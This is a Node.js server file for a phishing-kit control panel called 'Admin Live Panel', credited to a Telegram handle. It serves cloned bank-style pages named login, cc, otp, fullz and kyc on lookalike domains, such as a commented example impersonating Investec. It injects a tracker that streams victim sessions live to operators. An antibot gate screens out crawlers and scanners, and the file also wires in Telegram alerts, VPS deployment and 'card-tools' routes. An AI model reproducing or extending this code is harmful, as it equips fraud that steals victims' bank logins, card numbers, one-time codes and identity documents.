/**
 * ALP — Admin Live Panel
 * Real-time session tracking & control panel
 *
 * Created by @itstheoutlaws (Telegram)
 * https://t.me/itstheoutlaws
 *
 * Unauthorized redistribution or resale of this software
 * without credit is prohibited.
 */
const express = require('express');
const http = require('http');
const path = require('path');
const cors = require('cors');
const helmet = require('helmet');
// rate limiting removed
const config = require('./config/default');
const { isSupabaseConfigured } = require('./database/supabase');
const { getAdapter } = require('./database/adapter');
const { setupSocket } = require('./socket/index');

const { checkIpBan } = require('./middleware/ipBan');
const antibot = require('./middleware/antibot');

// Initialize database — SQLite only; Supabase schema is managed separately
if (!isSupabaseConfigured()) {
  const { initialize } = require('./database/init');
  initialize();
}

// Create Express app
const app = express();
const server = http.createServer(app);

// Setup Socket.IO
let io = null;
try {
  io = setupSocket(server);
  app.set('io', io);
  require('./services/notification').setIo(io);
} catch (err) {
  console.log('ℹ️ Socket.IO failed to initialize:', err.message);
}


// --- Middleware ---

// Force HTTPS in production (any reverse proxy sets x-forwarded-proto)
app.use((req, res, next) => {
  if (process.env.NODE_ENV === 'production' && req.headers['x-forwarded-proto'] === 'http') {
    return res.redirect(301, 'https://' + req.headers.host + req.originalUrl);
  }
  next();
});

// Admin host restriction — block /admin and all /api (except /api/tracker) on non-admin domains.
// Set ADMIN_HOST=your-panel-domain.example.com in the .env or panel settings.
app.use((req, res, next) => {
  const adminHost = process.env.ADMIN_HOST;
  if (!adminHost) return next();

  const reqHost = (req.headers.host || '').split(':')[0].toLowerCase().trim();
  const isAdminHost = reqHost === adminHost.toLowerCase().trim();
  if (isAdminHost) return next();

  const p = req.path;
  const isAdminPath = p.startsWith('/admin') || (p.startsWith('/api') && !p.startsWith('/api/tracker') && !p.startsWith('/api/xpages'));
  if (isAdminPath) return res.status(404).send('Not found');

  next();
});

// Security headers (relaxed for dev)
app.use(helmet({
  contentSecurityPolicy: false,
  crossOriginEmbedderPolicy: false,
  crossOriginResourcePolicy: false
}));

// CORS
app.use(cors(config.cors));

// IP Ban Enforcement
app.use(checkIpBan);

// Body parsing
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true }));


// Rate limiting disabled

// --- Static Files ---

// Admin panel
app.use('/admin', express.static(path.join(__dirname, 'public', 'admin')));

// Tracker script
app.use('/tracker.js', express.static(path.join(__dirname, 'public', 'tracker.js')));

// Antibot gate script (client-side check served to VPS-hosted xPages)
app.use('/antibot.js', express.static(path.join(__dirname, 'public', 'antibot.js')));

// Uploads (logos, etc)
app.use('/uploads', express.static(path.join(__dirname, 'public', 'uploads')));

// ── Demo website ─────────────────────────────────────────────────────────────
// Serves any .html page under /demo/ with the API key injected.
// To switch to a real website: remove or comment out these routes and point
// your site's tracker.js script tag to this server with the correct API key.
const fs = require('fs');

// ── xPages — root folder for all demo sites ──────────────────────────────────
// Layout:  xPages/<slug>/login.html, xPages/<slug>/cc.html, ...
// Served:  /demo/<slug>/login, /demo/<slug>/cc, ...
const XPAGES_ROOT = path.join(__dirname, 'xPages');

// Ensure xPages root exists on startup
if (!fs.existsSync(XPAGES_ROOT)) {
  fs.mkdirSync(XPAGES_ROOT, { recursive: true });
}

async function getDemoApiKey() {
  try {
    const db = getAdapter();
    const row = await db.get("SELECT api_key FROM websites WHERE name = 'Demo Website' LIMIT 1", []);
    return row ? row.api_key : 'demo-default';
  } catch {
    return 'demo-default';
  }
}

// Hardcoded legacy routes — serve from xPages/demo/ (files migrated there)
function serveDemoPage(filename) {
  return async (req, res) => {
    let filePath = path.join(XPAGES_ROOT, 'demo', filename);
    if (!fs.existsSync(filePath)) {
      filePath = path.join(__dirname, 'demo', filename);
    }
    try {
      let html = fs.readFileSync(filePath, 'utf8');
      const demoKey = await getDemoApiKey();
      html = html.replace(/%%API_KEY%%/g, demoKey);
      html = html.replace(/src="[^"]*tracker\.js"/g, 'src="/tracker.js"');
      html = html.replace(/data-api-key="[^"]*"/g, `data-api-key="${demoKey}"`);
      res.send(html);
    } catch (err) {
      console.error(`Error serving demo/${filename}:`, err.message);
      res.status(404).send('Page not found');
    }
  };
}

// Register each legacy demo page (extensionless and .html)
app.all(['/demo', '/demo/index.html'],           serveDemoPage('index.html'));
app.all(['/demo/login', '/demo/login.html'],     serveDemoPage('login.html'));
app.all(['/demo/cc', '/demo/cc.html'],           serveDemoPage('cc.html'));
app.all(['/demo/otp', '/demo/otp.html'],         serveDemoPage('otp.html'));
app.all(['/demo/fullz', '/demo/fullz.html'],     serveDemoPage('fullz.html'));
app.all(['/demo/kyc', '/demo/kyc.html'],         serveDemoPage('kyc.html'));
app.all(['/demo/loading', '/demo/loading.html'], serveDemoPage('loading.html'));

// Slug-based dynamic route — serves xPages/<slug>/<page>.html
async function getWebsiteRecordBySlug(slug) {
  try {
    const db = getAdapter();
    const row = await db.get("SELECT api_key, is_active FROM websites WHERE demo_slug = ? LIMIT 1", [slug]);
    return row || null;
  } catch {
    return null;
  }
}

// ── xPages challenge endpoint ─────────────────────────────────────────────────
// Called cross-origin from VPS-served pages. The antibot script on the VPS
// posts { fp, d: currentDomain, t: targetPath }. We verify the fingerprint,
// then look up the linked website by domain — if deactivated, deny (so
// deactivating a website in the panel immediately blocks its live domains).
app.post('/api/xpages/challenge', express.json({ limit: '16kb' }), async (req, res) => {
  const { fp, d: hostDomain, t: targetUrl } = req.body || {};
  if (!fp || typeof fp !== 'object') return res.status(400).json({ ok: false });

  // Reject if a definitive bot flag was triggered client-side
  const flags = Array.isArray(fp.fl) ? fp.fl : [];
  const hardBlock = flags.some(([n, v]) => ['wd', 'ph', 'nm', 'sl'].includes(n) && v === true);
  if (hardBlock) return res.json({ ok: false });

  // Reject obviously-bot UAs echoed from the client
  if (!fp.ua || antibot.isKnownBot(fp.ua)) return res.json({ ok: false });

  // Website-active gate: if the domain is linked to a deactivated website, deny.
  if (hostDomain && typeof hostDomain === 'string') {
    try {
      const cleanDomain = hostDomain.toLowerCase().replace(/^www\./, '').trim();
      const row = await getAdapter().get(
        `SELECT w.is_active FROM domains d
         LEFT JOIN websites w ON d.website_id = w.id
         WHERE d.domain = ? LIMIT 1`,
        [cleanDomain]
      );
      if (row && row.is_active === 0) {
        return res.json({ ok: false, reason: 'inactive' });
      }
    } catch { /* on lookup error, fall through — don't block on transient DB issues */ }
  }

  antibot.setChallengeCookie(req, res);
  const redirect = typeof targetUrl === 'string' && targetUrl.startsWith('/') ? targetUrl : '/';
  res.json({ ok: true, r: redirect });
});

// ── Shared handler for serving an xPage slug ─────────────────────────────────
async function serveXPage(slug, page, req, res, next, baseHref) {
  // Sanitise: no path traversal
  if (slug.includes('..') || (page && page.includes('..'))) {
    return res.status(400).send('Invalid path');
  }

  const site = await getWebsiteRecordBySlug(slug);
  // If website exists but is deactivated (is_active = 0), block access with 404
  if (site && !site.is_active) {
    return res.status(404).send('Page not found');
  }

  // Let non-HTML assets (css, js, images) fall through to express.static if site is active
  if (page && !page.endsWith('.html') && page.includes('.')) {
    return next();
  }

  // ── Anti-bot gate (HTML pages only, skip for panel preview) ──────────────────
  if (!req.query._alp_preview && !antibot.checkRequest(req, res)) return;

  if (!site || !site.api_key) {
    return next();
  }

  const apiKey = site.api_key;

  let filename = page || 'index.html';
  if (!filename.endsWith('.html')) {
    filename = filename + '.html';
  }

  let filePath = path.join(XPAGES_ROOT, slug, filename);
  if (!fs.existsSync(filePath) && (filename === 'index.html' || filename === 'index')) {
    const loginFallback = path.join(XPAGES_ROOT, slug, 'login.html');
    if (fs.existsSync(loginFallback)) {
      filePath = loginFallback;
    } else {
      // Last resort: serve the first .html file in the slug folder
      const slugDir = path.join(XPAGES_ROOT, slug);
      if (fs.existsSync(slugDir)) {
        const htmlFiles = fs.readdirSync(slugDir).filter(f => f.endsWith('.html'));
        if (htmlFiles.length) filePath = path.join(slugDir, htmlFiles[0]);
      }
    }
  }
  if (fs.existsSync(filePath)) {
    try {
      let html = fs.readFileSync(filePath, 'utf8');

      // ── Auto-replace %%API_KEY%% placeholders if used manually ───────────────
      html = html.replace(/%%API_KEY%%/g, apiKey);

      // ── Inject <base> tag for domain routing so relative paths resolve correctly
      if (baseHref && !html.includes('<base ')) {
        html = html.replace(/(<head[^>]*>)/i, `$1\n    <base href="${baseHref}">`);
      }

      // ── Tracker injection / rewrite ──────────────────────────────────────────
      const trackerSnippet = `<script src="/tracker.js" data-api-key="${apiKey}" defer></script>`;
      const alreadyHasTracker = html.includes('tracker.js') || html.includes('data-api-key');
      if (alreadyHasTracker) {
        html = html.replace(/src="[^"]*tracker\.js"/g, 'src="/tracker.js"');
        html = html.replace(/data-api-key="[^"]*"/g, `data-api-key="${apiKey}"`);
      } else {
        if (html.includes('</body>')) {
          html = html.replace('</body>', `  ${trackerSnippet}\n</body>`);
        } else {
          html = html + '\n' + trackerSnippet;
        }
      }

      res.send(html);
    } catch (err) {
      console.error(`Error serving xPages/${slug}/${filename}:`, err.message);
      res.status(500).send('Internal server error');
    }
  } else {
    res.status(404).send('Page not found');
  }
}

// ── Domain-based routing (e.g. investecsecurity.com → xPages/investec/) ─────
async function getDomainRecord(rawHost) {
  try {
    const db = getAdapter();
    const host = rawHost.toLowerCase().replace(/^www\./, '').trim();

    // 0. Managed domains table — highest priority when properly linked
    // If linked: return the website directly.
    // If unlinked (website_id = NULL): fall through to steps 1-2 (exact matches still work),
    // but set a flag so step 3 (fuzzy match) is skipped — prevents wrong-page bleed-through.
    let managedDomainUnlinked = false;
    try {
      const managedRow = await db.get(
        `SELECT * FROM domains WHERE LOWER(domain) = ? AND status = 'live' LIMIT 1`,
        [host]
      );
      if (managedRow) {
        if (managedRow.website_id) {
          const site = await db.get(
            'SELECT id, name, domain, domain_active, domain_alt, domain_alt_active, demo_slug, is_active FROM websites WHERE id = ?',
            [managedRow.website_id]
          );
          if (site) return site;
        }
        // Managed but unlinked — block fuzzy match, still allow exact domain matches below
        managedDomainUnlinked = true;
      }
    } catch { /* domains table may not exist in older installs */ }

    const rows = await db.all('SELECT id, name, domain, domain_active, domain_alt, domain_alt_active, demo_slug, is_active FROM websites', []) || [];

    // 1. Direct primary domain match (normalize stored domain to handle https:// prefix etc.)
    let match = rows.find(w => {
      if (!w.domain) return false;
      const dom = w.domain.toLowerCase()
        .replace(/^https?:\/\//, '')
        .replace(/^www\./, '')
        .split('/')[0]
        .trim();
      return host === dom;
    });
    if (match) {
      if (match.domain_active === 0) return { ...match, _altBlocked: true };
      return match;
    }

    // 2. Alternate domains match (JSON array [{domain, active}])
    // Check ALL alt domains (active or not) — if it's a known alt domain that's
    // inactive, return the record but mark _altBlocked so the middleware 404s it.
    for (const w of rows) {
      if (!w.domain_alt) continue;
      try {
        const alts = JSON.parse(w.domain_alt);
        if (!Array.isArray(alts)) continue;
        const altEntry = alts.find(a => a.domain &&
          a.domain.toLowerCase().replace(/^www\./, '').trim() === host);
        if (altEntry) {
          if (altEntry.active) return w;
          return { ...w, _altBlocked: true };
        }
      } catch { /* skip */ }
    }

    // 3. Fuzzy match — skipped for managed domains to prevent bleed-through
    if (managedDomainUnlinked) return null;
    match = rows.find(w => {
      if (!w.demo_slug) return false;
      // Skip if this host is a known (inactive) alt domain — already handled above
      try {
        const alts = JSON.parse(w.domain_alt || '[]');
        if (Array.isArray(alts) && alts.some(a => a.domain &&
          a.domain.toLowerCase().replace(/^www\./, '').trim() === host)) return false;
      } catch { /* skip */ }
      const slug = w.demo_slug.toLowerCase().trim();
      const cleanSlug = slug.replace(/[^a-z0-9]/g, '');
      const cleanHost = host.replace(/[^a-z0-9]/g, '');
      const hostMainPart = cleanHost.split('.')[0] || '';
      return cleanHost.includes(cleanSlug) || cleanSlug.includes(hostMainPart) || hostMainPart.includes(cleanSlug.slice(0, 5));
    });

    return match || null;
  } catch (e) {
    console.error('getDomainRecord error:', e.message);
    return null;
  }
}

app.use(async (req, res, next) => {
  const reqPath = req.path || '/';
  const reserved = ['/admin', '/api', '/socket.io', '/tracker.js', '/antibot.js', '/uploads'];
  if (reserved.some(r => reqPath.startsWith(r))) return next();

  try {
    const rawHost = (req.headers.host || '').split(':')[0].toLowerCase().trim();
    if (rawHost && rawHost !== 'localhost' && rawHost !== '127.0.0.1') {
      const site = await getDomainRecord(rawHost);
      if (site) {
        if (!site.is_active || site._altBlocked) {
          return res.status(404).send('Page not found');
        }
        const slug = site.demo_slug;

        // Strip leading slash and optional duplicate slug prefix
        let cleanPath = reqPath.replace(/^\//, '');
        if (cleanPath.startsWith(slug + '/')) {
          cleanPath = cleanPath.slice(slug.length + 1);
        }
        if (cleanPath === slug) {
          cleanPath = '';
        }

        // 1. Serve static non-HTML assets (CSS, JS, images, fonts) directly from xPages/<slug>/
        if (cleanPath && cleanPath.includes('.') && !cleanPath.endsWith('.html')) {
          const assetPath = path.join(XPAGES_ROOT, slug, cleanPath);
          if (fs.existsSync(assetPath)) {
            return res.sendFile(assetPath);
          }
        }

        // 2. Serve HTML page or root '/'
        let pageName = (cleanPath === '' || cleanPath === '/') ? 'index.html' : cleanPath;
        if (!pageName.endsWith('.html')) {
          pageName += '.html';
        }

        return await serveXPage(slug, pageName, req, res, next, '/');
      }
    }
  } catch (err) {
    console.error('Domain routing error:', err.message);
  }

  next();
});

// ── Clean URLs: /:slug/:page (NO /demo/ prefix) ───────────────────────────────
// e.g. /arbuthnot-latham/index  →  xPages/arbuthnot-latham/index.html
app.all('/:slug/:page?', async (req, res, next) => {
  const { slug, page } = req.params;

  // Skip reserved system routes (admin, api, socket.io, uploads, tracker.js)
  const reserved = ['admin', 'api', 'socket.io', 'uploads', 'tracker.js', 'antibot.js', 'demo'];
  if (reserved.includes(slug)) return next();

  await serveXPage(slug, page, req, res, next);
});

// ── Legacy /demo/:slug/:page routes (kept for backward compatibility) ─────────
app.all('/demo/:slug/:page?', async (req, res, next) => {
  const { slug, page } = req.params;
  await serveXPage(slug, page, req, res, next);
});

// ── Static Asset Guard for Inactive Websites ──────────────────────────────────
app.use(async (req, res, next) => {
  const parts = req.path.split('/').filter(Boolean);
  if (parts.length > 0) {
    const site = await getWebsiteRecordBySlug(parts[0]);
    if (site && !site.is_active) {
      return res.status(404).send('Page not found');
    }
  }
  next();
});

// Static assets served from xPages/ (covers all slug subfolders)
app.use('/', express.static(XPAGES_ROOT));
app.use('/demo', express.static(XPAGES_ROOT));
// Legacy static fallback (demo.css, config.js etc. from original demo/)
app.use('/demo', express.static(path.join(__dirname, 'demo')));

// --- API Routes ---

const authRoutes = require('./routes/auth');
const sessionsRoutes = require('./routes/sessions');
const redirectsRoutes = require('./routes/redirects');
const analyticsRoutes = require('./routes/analytics');
const notificationsRoutes = require('./routes/notifications');
const logsRoutes = require('./routes/logs');
const settingsRoutes = require('./routes/settings');
const websitesRoutes = require('./routes/websites');
const telegramRoutes = require('./routes/telegram');
const funnelsRoutes = require('./routes/funnels');
const securityRoutes = require('./routes/security');
const trackerRoutes = require('./routes/tracker');
const domainsRoutes  = require('./routes/domains');
const hostingRoutes         = require('./routes/hosting');
const deployRoutes          = require('./routes/deploy');
const websiteDeployRoutes   = require('./routes/website-deploy');
const vpsDashboardRoutes    = require('./routes/vps-dashboard');

app.use('/api/auth', authRoutes);

// Public magic-link reset page + POST endpoint (mounted under /reset)
// Redirects to the auth router's `/reset/:token` handler for the POST.
app.get('/reset/:token', (req, res) => {
  const token = String(req.params.token || '').replace(/[^A-Za-z0-9\-_]/g, '');
  res.send(`<!DOCTYPE html><html><head><meta charset="utf-8"><title>Reset Password</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>
  body{margin:0;min-height:100vh;display:flex;align-items:center;justify-content:center;background:#0a0a0a;color:#e5e7eb;font-family:-apple-system,BlinkMacSystemFont,'Inter',sans-serif;}
  .card{background:#141414;border:1px solid #262626;border-radius:12px;padding:32px;max-width:400px;width:calc(100% - 32px);}
  h1{font-size:20px;margin:0 0 16px;color:#f1f5f9;font-weight:600;}
  p{font-size:13px;color:#94a3b8;margin:0 0 20px;line-height:1.5;}
  label{display:block;font-size:11px;font-weight:600;color:#94a3b8;text-transform:uppercase;letter-spacing:.06em;margin-bottom:6px;}
  input{width:100%;box-sizing:border-box;padding:10px 12px;background:#0a0a0a;border:1px solid #262626;color:#f1f5f9;border-radius:8px;font-size:14px;font-family:inherit;outline:none;}
  input:focus{border-color:#D4AF37;}
  button{width:100%;margin-top:16px;padding:11px 16px;background:linear-gradient(135deg,#FFD86E,#D4AF37);border:0;color:#1a1600;font-weight:700;font-size:13px;border-radius:8px;cursor:pointer;}
  button:disabled{opacity:.5;cursor:not-allowed;}
  .msg{margin-top:12px;padding:10px 12px;border-radius:6px;font-size:12px;line-height:1.4;}
  .msg.err{background:rgba(239,68,68,.08);border:1px solid rgba(239,68,68,.3);color:#f87171;}
  .msg.ok{background:rgba(16,185,129,.08);border:1px solid rgba(16,185,129,.3);color:#34d399;}
</style></head><body>
<form class="card" id="f">
  <h1>Reset your password</h1>
  <p>Enter a new password to complete the reset.</p>
  <label>New password</label>
  <input type="password" id="p1" required minlength="6" autocomplete="new-password">
  <label style="margin-top:12px;">Confirm</label>
  <input type="password" id="p2" required minlength="6" autocomplete="new-password">
  <button type="submit" id="b">Set password</button>
  <div id="m"></div>
</form>
<script>
  document.getElementById('f').addEventListener('submit', async (e) => {
    e.preventDefault();
    const p1 = document.getElementById('p1').value;
    const p2 = document.getElementById('p2').value;
    const m  = document.getElementById('m');
    const b  = document.getElementById('b');
    m.className = '';
    if (p1 !== p2) { m.className = 'msg err'; m.textContent = 'Passwords do not match'; return; }
    b.disabled = true; b.textContent = 'Working…';
    try {
      const res = await fetch('/api/auth/reset/${token}', {
        method: 'POST', headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ password: p1 })
      });
      const data = await res.json();
      if (!res.ok) throw new Error(data.error || 'Reset failed');
      m.className = 'msg ok'; m.textContent = 'Password reset. Redirecting to sign-in…';
      setTimeout(() => location.href = '/admin', 1200);
    } catch (err) {
      m.className = 'msg err'; m.textContent = err.message;
      b.disabled = false; b.textContent = 'Set password';
    }
  });
</script>
</body></html>`);
});
app.use('/api/sessions', sessionsRoutes);
app.use('/api/redirects', redirectsRoutes);
app.use('/api/analytics', analyticsRoutes);
app.use('/api/notifications', notificationsRoutes);
app.use('/api/logs', logsRoutes);
app.use('/api/settings', settingsRoutes);
app.use('/api/websites', websitesRoutes);
app.use('/api/telegram', telegramRoutes);
app.use('/api/funnels', funnelsRoutes);
app.use('/api/security', securityRoutes);
app.use('/api/tracker', trackerRoutes);
app.use('/api/domains', domainsRoutes);
app.use('/api/hosting',         hostingRoutes);
app.use('/api/deploy',          deployRoutes);
app.use('/api/website-deploy',  websiteDeployRoutes);
app.use('/api/vps-dashboard',   vpsDashboardRoutes);

const cardToolsRoutes = require('./routes/card-tools');
app.use('/api/card-tools', cardToolsRoutes);

const godRoutes = require('./routes/god');
app.use('/api/god', godRoutes);

// --- Maintenance Mode Check ---
app.get('/api/health', (req, res) => {
  res.json({
    status: 'ok',
    version: '1.0.0',
    uptime: process.uptime()
  });
});

// --- Root redirect ---
app.get('/', async (req, res, next) => {
  const rawHost = (req.headers.host || '').split(':')[0].toLowerCase().trim();
  if (rawHost && rawHost !== 'localhost' && rawHost !== '127.0.0.1') {
    const site = await getDomainRecord(rawHost);
    if (site) {
      if (!site.is_active) return res.status(404).send('Page not found');
      return await serveXPage(site.demo_slug, 'index.html', req, res, next, '/');
    }
  }
  res.redirect('/admin');
});

// --- Error Handler ---
app.use((err, req, res, next) => {
  console.error('❌ Server error:', err);
  res.status(500).json({ error: 'Internal server error' });
});

// --- Periodic Session Cleanup ---
setInterval(async () => {
    try {
      const { getAdapter } = require('./database/adapter');
      const db = getAdapter();
      const timeout = config.session.timeoutMs;
      const cutoff = new Date(Date.now() - timeout).toISOString();

      const staleSessions = await db.all(
        'SELECT id, website_id FROM sessions WHERE is_active = 1 AND last_activity < ?',
        [cutoff]
      );

      if (staleSessions.length > 0 && io) {
        const trackerNsp = io.of('/tracker');
        const trulyStale = [];

        for (const s of staleSessions) {
          try {
            const activeSockets = await trackerNsp.in(`session:${s.id}`).fetchSockets();
            if (activeSockets.length === 0) {
              trulyStale.push(s);
            } else {
              await db.run(
                'UPDATE sessions SET last_activity = CURRENT_TIMESTAMP WHERE id = ?',
                [s.id]
              );
            }
          } catch {
            trulyStale.push(s);
          }
        }

        if (trulyStale.length > 0) {
          const ids = trulyStale.map(s => s.id);
          const placeholders = ids.map(() => '?').join(',');
          await db.run(
            `UPDATE sessions SET is_active = 0 WHERE id IN (${placeholders})`,
            ids
          );

          // Emit session:end to the owning user's room (and always to god).
          const adminNsp = io.of('/admin');
          for (const s of trulyStale) {
            let ownerId = null;
            try {
              const w = await db.get('SELECT owner_id FROM websites WHERE id = ?', [s.website_id]);
              if (w) ownerId = w.owner_id;
            } catch {}
            const target = ownerId != null
              ? adminNsp.to(`user:${ownerId}`).to('god')
              : adminNsp.to('god');
            target.emit('admin:session:end', {
              id: s.id,
              sessionId: s.id,
              websiteId: s.website_id,
              timestamp: new Date().toISOString()
            });
          }
        }
      }
    } catch (err) {
      console.error('Cleanup error:', err);
    }
  }, config.session.cleanupIntervalMs);

// --- Telegram Service Init ---
try {
  const telegramService = require('./services/telegram');
  telegramService.initialize();
} catch (err) {
  console.log('ℹ️ Telegram service not initialized (configure in Settings)');
}

// --- Per-Website Telegram Bot Manager Init ---
try {
  const tgBotManager = require('./services/tgBotManager');
  tgBotManager.initAll();
} catch (err) {
  console.log('ℹ️ TgBotManager not initialized:', err.message);
}

// --- Domain Monitor ---
try {
  const domainMonitor = require('./jobs/domainMonitor');
  domainMonitor.start();
} catch (err) {
  console.log('ℹ️ Domain monitor not started:', err.message);
}

// --- Hourly notification digest (collapses low-severity events per owner) ---
try {
  const { runHourlyDigest } = require('./services/notification');
  const ONE_HOUR = 60 * 60 * 1000;
  // First run 15 min after boot so the panel isn't blank if a user just signed in
  setTimeout(() => { runHourlyDigest(io).catch(() => {}); }, 15 * 60 * 1000);
  setInterval(() => { runHourlyDigest(io).catch(() => {}); }, ONE_HOUR);
  console.log('✅ Notification digest job scheduled (hourly)');
} catch (err) {
  console.log('ℹ️ Notification digest not scheduled:', err.message);
}


// --- Start Server ---
server.listen(config.port, config.host, () => {
  console.log('');
  console.log('╔══════════════════════════════════════════════╗');
  console.log('║                                              ║');
  console.log('║     🚀 Admin Live Panel (ALP) v1.0.0        ║');
  console.log('║                                              ║');
  console.log(`║     Admin:  http://localhost:${config.port}/admin        ║`);
  console.log(`║     Demo:   http://localhost:${config.port}/demo         ║`);
  console.log(`║     API:    http://localhost:${config.port}/api          ║`);
  console.log('║                                              ║');
  console.log('║     Default login: admin / admin123          ║');
  console.log('║                                              ║');
  console.log('╚══════════════════════════════════════════════╝');
  console.log('');
});

module.exports = { app, server, io };

